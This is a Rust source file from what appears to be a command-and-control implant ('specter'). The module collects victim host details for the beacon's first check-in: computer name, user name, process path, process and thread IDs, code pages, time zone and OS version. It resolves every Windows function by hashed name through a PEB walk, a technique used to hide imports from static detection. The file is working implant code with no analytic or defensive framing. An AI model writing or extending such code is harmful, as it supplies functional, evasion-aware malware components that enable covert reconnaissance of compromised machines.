//! Sysinfo collection for the first check-in beat (phase 3): resolved by
//! hash at bootstrap, filling the BeatData fields. Unsafe glue like the
//! rest of the runtime; the beat layout itself is pure (core::beat).

use core::ffi::c_void;

use specter_core::fnv::fnv1a64;
use specter_core::peb::Peb;

use crate::runtime::bootstrap;

const H_KERNEL32: u64 = specter_core::fnv::fnv1a64_wide_ascii_ci("kernel32.dll");
const H_ADVAPI32: u64 = specter_core::fnv::fnv1a64_wide_ascii_ci("advapi32.dll");
const H_GET_ACP: u64 = fnv1a64(b"GetACP");
const H_GET_OEMCP: u64 = fnv1a64(b"GetOEMCP");
const H_GET_CURRENT_PROCESS_ID: u64 = fnv1a64(b"GetCurrentProcessId");
const H_GET_CURRENT_THREAD_ID: u64 = fnv1a64(b"GetCurrentThreadId");
const H_GET_COMPUTER_NAME_A: u64 = fnv1a64(b"GetComputerNameA");
const H_GET_USER_NAME_A: u64 = fnv1a64(b"GetUserNameA");
const H_GET_MODULE_FILE_NAME_A: u64 = fnv1a64(b"GetModuleFileNameA");
const H_RTL_GET_VERSION: u64 = fnv1a64(b"RtlGetVersion");
const H_GET_TIME_ZONE_INFORMATION: u64 = fnv1a64(b"GetTimeZoneInformation");

/// Partial OSVERSIONINFOW: size(+0), major(+4), minor(+8), build(+0xC).
#[repr(C)]
pub struct VersionInfo {
    pub size: u32,
    pub major: u32,
    pub minor: u32,
    pub build: u32,
    _rest: [u8; 0xE8 - 0x10],
}

/// Collected identity, stored on the instance (stack-resident buffers).
pub struct SysInfo {
    pub acp: u16,
    pub oemcp: u16,
    pub pid: u16,
    pub tid: u16,
    pub major: u8,
    pub minor: u8,
    pub build: u32,
    /// GMT offset in hours (`-(TIME_ZONE_INFORMATION.Bias / 60)`).
    pub gmt_offset: i8,
    pub computer: [u8; 64],
    pub computer_len: usize,
    pub username: [u8; 64],
    pub username_len: usize,
    pub process: [u8; 260],
    pub process_len: usize,
    pub process_name_off: usize,
}

impl SysInfo {
    /// Empty identity (used if any resolution fails: the beat still goes
    /// out with what we have — partial identity beats no check-in).
    pub fn empty() -> Self {
        SYSINFO_DEFAULT
    }
    pub fn computer(&self) -> &[u8] {
        &self.computer[..self.computer_len]
    }
    pub fn username(&self) -> &[u8] {
        &self.username[..self.username_len]
    }
    /// Process name: the file name part of the module path.
    pub fn process_name(&self) -> &[u8] {
        &self.process[self.process_name_off..self.process_len]
    }
}

const SYSINFO_DEFAULT: SysInfo = SysInfo {
    acp: 1252,
    oemcp: 437,
    pid: 0,
    tid: 0,
    major: 10,
    minor: 0,
    build: 0,
    gmt_offset: 0,
    computer: [0; 64],
    computer_len: 0,
    username: [0; 64],
    username_len: 0,
    process: [0; 260],
    process_len: 0,
    process_name_off: 0,
};

/// Collect the identity. Failure of any single API leaves its field at
/// the default — never fatal.
///
/// # Safety
///
/// Runs on the beacon thread after module resolution; PEB valid.
pub unsafe fn collect(peb: *mut Peb) -> SysInfo {
    let mut info = SysInfo::empty();
    let kernel32 = specter_core::peb::find_module(peb, H_KERNEL32);
    let advapi32 = specter_core::peb::find_module(peb, H_ADVAPI32);
    let _ = bootstrap::instance(); // presence only (no gs dependency here)

    let export = |module: *mut c_void, hash: u64| -> *mut c_void {
        if module.is_null() {
            core::ptr::null_mut()
        } else {
            specter_core::peb::find_export(module, hash)
        }
    };

    if !kernel32.is_null() {
        let p = export(kernel32, H_GET_ACP);
        if !p.is_null() {
            info.acp = (*(p as *const unsafe extern "system" fn() -> u32))() as u16;
        }
        let p = export(kernel32, H_GET_OEMCP);
        if !p.is_null() {
            info.oemcp = (*(p as *const unsafe extern "system" fn() -> u32))() as u16;
        }
        let p = export(kernel32, H_GET_CURRENT_PROCESS_ID);
        if !p.is_null() {
            info.pid = (*(p as *const unsafe extern "system" fn() -> u32))() as u16;
        }
        let p = export(kernel32, H_GET_CURRENT_THREAD_ID);
        if !p.is_null() {
            info.tid = (*(p as *const unsafe extern "system" fn() -> u32))() as u16;
        }

        let p = export(kernel32, H_GET_COMPUTER_NAME_A);
        if !p.is_null() {
            let mut len: u32 = 64;
            let ok = (*(p as *const unsafe extern "system" fn(*mut u8, *mut u32) -> i32))(
                info.computer.as_mut_ptr(),
                &mut len,
            );
            if ok != 0 {
                info.computer_len = len as usize;
            }
        }

        let p = export(kernel32, H_GET_MODULE_FILE_NAME_A);
        if !p.is_null() {
            let n = (*(p as *const unsafe extern "system" fn(*mut c_void, *mut u8, u32) -> u32))(
                core::ptr::null_mut(),
                info.process.as_mut_ptr(),
                260,
            );
            info.process_len = n as usize;
            // File name = after the last backslash.
            let mut i = 0usize;
            while i < info.process_len {
                if info.process[i] == b'\\' {
                    info.process_name_off = i + 1;
                }
                i += 1;
            }
            if info.process_name_off >= info.process_len {
                info.process_name_off = 0;
            }
        }
    }

    // GMT offset: Bias is the first i32 of TIME_ZONE_INFORMATION
    // (172 bytes = 86 u16; only the first word pair is read).
    let p = export(kernel32, H_GET_TIME_ZONE_INFORMATION);
    if !p.is_null() {
        let mut tzi = [0u16; 86];
        let zone = (*(p as *const unsafe extern "system" fn(*mut u16) -> u32))(tzi.as_mut_ptr());
        if zone <= 2 {
            let bias = ((tzi[1] as i32) << 16) | (tzi[0] as i32);
            let hours = -bias / 60;
            if (-128..=127).contains(&hours) {
                info.gmt_offset = hours as i8;
            }
        }
    }

    if !advapi32.is_null() {
        let p = export(advapi32, H_GET_USER_NAME_A);
        if !p.is_null() {
            let mut len: u32 = 64;
            let ok = (*(p as *const unsafe extern "system" fn(*mut u8, *mut u32) -> i32))(
                info.username.as_mut_ptr(),
                &mut len,
            );
            if ok != 0 {
                info.username_len = len as usize;
            }
        }
    }

    // OS version via RtlGetVersion (ntdll, already resolved by the caller
    // through the bootstrap; re-resolve through the PEB for isolation).
    let ntdll =
        specter_core::peb::find_module(peb, specter_core::fnv::fnv1a64_wide_ascii_ci("ntdll.dll"));
    if !ntdll.is_null() {
        let p = export(ntdll, H_RTL_GET_VERSION);
        if !p.is_null() {
            let mut v = VersionInfo {
                size: core::mem::size_of::<VersionInfo>() as u32,
                major: 0,
                minor: 0,
                build: 0,
                _rest: [0; 0xE8 - 0x10],
            };
            let ok = (*(p as *const unsafe extern "system" fn(*mut VersionInfo) -> i32))(&mut v);
            if ok == 0 {
                info.major = v.major as u8;
                info.minor = v.minor as u8;
                info.build = v.build;
            }
        }
    }
    info
}
